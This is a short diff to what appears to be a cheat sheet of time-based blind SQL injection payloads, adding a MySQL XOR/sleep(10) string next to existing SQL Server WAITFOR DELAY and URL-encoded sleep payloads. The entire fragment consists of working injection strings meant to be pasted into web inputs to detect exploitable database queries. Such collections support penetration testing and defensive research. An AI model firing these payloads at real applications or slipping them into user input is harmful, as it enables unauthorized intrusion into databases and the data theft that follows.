@@ -18,6 +18,10 @@ MSQL
 1' WAITFOR DELAY '0:0:10'
 ```
 
+```
+/*'XOR(if(2=2,sleep(10),0))OR'
+```
+
 
 ```
 %2c(select%20*%20from%20(select(sleep(10)))a)
